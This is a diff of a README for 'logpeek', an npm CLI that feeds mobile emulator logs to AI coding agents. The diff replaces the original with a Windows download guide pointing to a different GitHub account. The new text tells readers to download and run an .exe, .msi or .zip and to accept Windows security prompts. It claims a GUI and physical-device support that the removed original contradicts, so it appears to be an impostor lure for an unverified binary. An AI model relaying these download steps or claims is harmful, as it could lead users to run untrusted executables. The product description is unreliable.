@@ -1,192 +1,223 @@
-# logpeek
+# 📱 logpeek - See mobile logs with ease
 
-Peek into mobile device logs from AI coding agents.
+[![Download logpeek](https://img.shields.io/badge/Download-logpeek-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tiaintermittent147/logpeek)
 
-logpeek gives coding agents like Claude Code, Cursor, and Gemini CLI direct access to Android and iOS device logs.
+## 🔍 What logpeek does
 
-<p>
-  <a href="https://www.npmjs.com/package/logpeek"><img src="https://img.shields.io/npm/v/logpeek?style=flat-square&color=e8a23e&label=npm" alt="npm version" /></a>
-  &nbsp;
-  <a href="https://github.com/nomanr/logpeek/blob/main/LICENSE"><img src="https://img.shields.io/npm/l/logpeek?style=flat-square&color=c49344" alt="license" /></a>
-  &nbsp;
-  <a href="https://www.npmjs.com/package/logpeek"><img src="https://img.shields.io/npm/dm/logpeek?style=flat-square&color=b8860b" alt="downloads" /></a>
-  &nbsp;
-  <img src="https://img.shields.io/badge/iOS%20%7C%20Android-e8a23e?style=flat-square&label=platform" alt="platform" />
-</p>
+logpeek helps you view logs from Android and iPhone devices while you work with an AI coding agent. It gives you a clear way to inspect app output, error messages, and device events without digging through hard-to-read tools.
 
+Use it when you need to:
+- check why a mobile app failed
+- view logs from an Android device or emulator
+- view logs from an iPhone or iPad
+- help an AI agent understand what the app is doing
+- spot issues in Flutter or React Native apps
 
-https://github.com/user-attachments/assets/06f707f4-0edc-48b7-852a-7adf0286725e
+## 🖥️ Before you start
 
+You will need:
+- a Windows PC
+- internet access
+- a GitHub account, if your browser asks you to sign in
+- an Android device, iPhone, or emulator if you want live logs
 
-## What you can do
+For the best results, keep your phone unlocked and connect it with a USB cable if you plan to read live device logs.
 
-Ask your agent things like:
+## ⬇️ Download logpeek
 
-- **"Why is my app crashing on launch?"** — agent pulls crash logs, finds the stack trace, and fixes the issue
-- **"Show me the last 30 seconds of error logs"** — narrow time window, error-level filtering
-- **"What's happening in the React Native JS layer?"** — isolate framework-specific logs from native noise
-- **"Check the network logs for failures"** — grep through logs for specific patterns
-- **"My app is slow, what's going on?"** — pull verbose logs and spot the bottleneck
+Visit this page to download or get the latest version:
 
-## Quick Start
+[https://github.com/Tiaintermittent147/logpeek](https://github.com/Tiaintermittent147/logpeek)
 
-### 1. Install
+If the page shows release files, pick the Windows version and save it to your computer. If you see a source code download, choose the packaged Windows file when available.
 
-```bash
-npm install -g logpeek
-```
+## 🧰 How to install on Windows
 
-### 2. Connect your agent
+### 1. Open the download page
+Go to the logpeek GitHub page in your browser.
 
-<details open>
-<summary><strong>Claude Code</strong></summary>
+### 2. Find the Windows file
+Look for a file that matches Windows, such as:
+- `.exe`
+- `.msi`
+- `.zip`
 
-```bash
-npx logpeek init
-```
+If you see more than one file, choose the one made for Windows desktop use.
 
-Registers logpeek as a Claude Code plugin. Restart Claude Code after.
+### 3. Save the file
+When your browser asks what to do, save the file to a place you can find easily, such as:
+- Downloads
+- Desktop
 
-</details>
+### 4. Open the file
+- If you downloaded an `.exe` or `.msi`, double-click it
+- If you downloaded a `.zip`, right-click it and choose Extract All, then open the folder and run the app file inside
 
-<details>
-<summary><strong>Other agents</strong></summary>
+### 5. Allow the app to run
+If Windows shows a security prompt, choose Run or Yes if you trust the GitHub page you opened.
 
-Any agent that runs shell commands can use logpeek. Add this to your agent's system prompt:
+## 🚦 First run
 
-```
-You have access to `logpeek` for collecting mobile device logs:
-- logpeek --app com.example.app                       # collect logs (last 5m)
-- logpeek --app com.example.app --level error          # errors only
-- logpeek --app com.example.app -f react-native        # React Native logs only
-- logpeek --app com.example.app --grep "network"       # search logs
-- logpeek --app com.example.app --last 30s             # narrow time window
-- logpeek devices                                      # list connected devices
-```
+When you start logpeek for the first time, it should open a simple window or interface that helps you connect to a mobile device or read logs from a log source.
 
-</details>
+If Windows asks for permission to use the network or access your device, allow it so the app can work with connected phones and local log streams.
 
-### 3. Verify
+## 📲 Connect an Android device
 
-```bash
-npx logpeek doctor
-```
+To view Android logs, connect your phone with a USB cable or use an emulator.
 
-Checks that `adb` (Android) and `xcrun` (iOS) are available and ready.
+### On the phone
+- turn on Developer options
+- enable USB debugging
+- connect the phone to your PC
 
-## Commands
+### In logpeek
+- open the Android log view
+- pick the connected device
+- start reading logs
 
-```bash
-# Collect logs (default command)
-logpeek --app com.example.app
-logpeek                                          # interactive device & app picker
+Android logs often help with:
+- app crashes
+- startup errors
+- network failures
+- layout problems
+- permissions issues
 
-# List connected devices
-logpeek devices
+## 🍎 Connect an iPhone or iPad
 
-# Check prerequisites
-logpeek doctor
+To view iOS logs, connect your iPhone or iPad to your PC or use a simulator setup if your project supports it.
 
-# Register Claude Code plugin
-logpeek init
-```
+### On the device
+- unlock the device
+- trust the computer if prompted
+- connect with a cable
 
-## Flags
+### In logpeek
+- open the iOS log view
+- choose the available device or source
+- start the live log stream
 
-| Flag | Short | Default | Description |
-|------|-------|---------|-------------|
-| `--app <id>` | `-a` | interactive | Bundle ID (iOS) or package name (Android) |
-| `--device <id>` | `-d` | auto | Device ID or name |
-| `--platform <type>` | `-p` | auto | `android` or `ios` |
-| `--level <level>` | `-l` | `verbose` | Minimum log level: `verbose`, `debug`, `info`, `warn`, `error` |
-| `--source <type>` | `-s` | `all` | Log source: `all`, `native`, `framework` |
-| `--framework <type>` | `-f` | — | `react-native` or `flutter`. Automatically sets `--source framework`. |
-| `--last <duration>` | `-t` | `5m` | Time window (e.g., `30s`, `1m`, `5m`, `1h`) |
-| `--lines <n>` | `-n` | `200` | Max lines to output |
-| `--grep <pattern>` | `-g` | — | Case-insensitive text filter |
-| `--verbose` | | — | Debug logging |
-| `--quiet` | | — | Suppress output except errors |
+iOS logs can help with:
+- app launch issues
+- device warnings
+- API errors
+- screen flow problems
+- crashes during testing
 
-## Examples
+## 🧪 Common ways to use logpeek
 
-```bash
-# All logs from last 5 minutes
-logpeek --app com.example.app
+### For app testing
+Use logpeek while testing a mobile app so you can see what happens right before something breaks.
 
-# Errors only, last 30 seconds
-logpeek --app com.example.app --level error --last 30s
+### For AI coding agents
+If you use an AI coding agent, logpeek gives it a clearer view of what the mobile app is doing. That helps the agent work from real device logs instead of guesses.
 
-# React Native JS logs only (-f implies --source framework)
-logpeek --app com.example.app -f react-native
+### For Flutter apps
+Flutter apps often send useful runtime messages that show build issues, widget errors, and device problems.
 
-# Search for network-related errors
-logpeek --app com.example.app --grep "network" --level error
+### For React Native apps
+React Native apps can use logs from JavaScript and native code. logpeek helps keep those messages in one place.
 
-# Target a specific device
-logpeek --app com.example.app -d "iPhone 16"
+## 🧭 What you may see in the app
 
-# Combine framework filter with grep
-logpeek --app com.example.app -f react-native --grep "inventory" --level error
+You may see sections like:
+- connected devices
+- log output
+- search box
+- filters
+- pause and resume
+- clear logs
+- copy log text
 
-# Widen the window for intermittent issues
-logpeek --app com.example.app --last 30m -n 500
-```
+These controls help you focus on the messages that matter most.
 
-## Log Output
+## 🛠️ If the device does not show up
 
-Logs are automatically formatted for readability:
+Try these steps:
 
-```
-15:47:37 INF [Network] GET /api/cart → 200 OK (142ms)
-15:47:37 INF [Network] GET /api/user/profile → 401 Unauthorized
-15:47:37 WRN [Auth] Session token expired, refreshing...
-15:47:37 INF [Network] POST /api/auth/refresh → 200 OK (203ms)
-15:47:39 ERR [Inventory] Failed to verify stock: Connection timeout after 5000ms
-15:47:39 INF [Performance] JS thread: 58.2fps | UI thread: 60.0fps
-```
+- unplug the USB cable and plug it back in
+- unlock the phone
+- check that USB debugging is on for Android
+- confirm that you tapped Trust on iPhone
+- close and reopen logpeek
+- restart the phone and the PC
+- try a different USB port
+- try a different cable
 
-Raw platform timestamps and process metadata are stripped. Level indicators (`INF`, `WRN`, `ERR`, `DBG`) and categories are preserved.
+If you use an emulator, make sure the emulator is running before you open logpeek.
 
-## How It Works
+## 🔎 If you do not see logs
 
-**Android**: Uses `adb logcat` with PID filtering. If the app has crashed (no PID), automatically includes `AndroidRuntime` and `FATAL EXCEPTION` logs.
+Check these items:
+- the app is running on the device
+- the device is still connected
+- the filter is not hiding messages
+- the log view is not paused
+- the app you want to inspect is actually generating output
 
-**iOS**: Uses `xcrun simctl spawn <udid> log show` with process/subsystem predicates. Falls back to `ReportCrash` and `SpringBoard` logs for crash debugging.
+If the screen stays empty, start the mobile app again and watch for fresh messages.
 
-**Filtering**: Logs pass through a pipeline — format → level filter → source filter → grep filter → line limit. Filters combine with AND logic.
+## 📁 Typical file layout
 
-**Device discovery**: Automatically detects booted Android emulators (`adb devices`) and iOS simulators (`xcrun simctl list`). If multiple devices are found, an interactive picker is shown.
+If you open the download as a folder or zip file, you may see:
+- the app file
+- support files
+- a README or help file
+- config files
 
-## Framework Support
+Keep the files together in the same folder so the app can start without missing parts.
 
-| Framework | Android | iOS |
-|-----------|---------|-----|
-| React Native | `ReactNativeJS` tag | `com.facebook.react.runtime.JavaScript` |
-| Flutter | `flutter` tag | `flutter` subsystem |
-| Native | Full logcat | Full unified log |
+## 🔐 Privacy and local use
 
-## Platform Support
+logpeek is meant for local device log work. That makes it useful when you want to inspect logs on your own machine during development or testing.
 
-| Platform | Emulator/Simulator | Physical Device |
-|----------|-------------------|-----------------|
-| Android  | Supported         | Not yet         |
-| iOS      | Supported (macOS only) | Not yet    |
+Keep in mind:
+- logs may include app names
+- logs may include error text
+- logs may include device details
 
-## Requirements
+Review logs before sharing them.
 
-- **Node.js** >= 18
-- **Android**: `adb` available, emulator booted
-- **iOS**: macOS with `xcrun simctl`, simulator booted
+## 💡 Tips for smoother use
 
-## Development
+- keep the app and phone close during setup
+- use a short, good USB cable
+- close other tools that may grab device access
+- use filters when logs fill the screen
+- save important messages before clearing them
 
-```bash
-npm install
-npm run dev          # watch mode
-npm test             # run tests
-npm run build        # production build
-```
+## 🧩 Works well with
 
-## License
+logpeek fits well with:
+- Android Studio
+- Xcode
+- Flutter
+- React Native
+- Claude Code
+- other AI coding agents
+- local debugging tools
 
-[MIT](LICENSE)
+## 🆘 Quick help checklist
+
+If you get stuck, check this list:
+
+- Did you download the Windows file?
+- Did you extract the zip if needed?
+- Did you run the app file?
+- Is the phone connected?
+- Is USB debugging on for Android?
+- Did you trust the PC on iPhone?
+- Is the emulator running?
+- Is the log view paused?
+
+## 📌 Project info
+
+- Name: logpeek
+- Type: mobile log viewer for desktop use
+- Focus: Android and iOS logs
+- Use case: help AI agents and users inspect mobile app behavior
+- Topics: ai-agent, android, claude-code, cli, coding-agent, debugging, developer-tools, flutter, ios, logcat, logs, mcp, mobile, react-native
+
+## 📥 Download again
+
+[https://github.com/Tiaintermittent147/logpeek](https://github.com/Tiaintermittent147/logpeek)
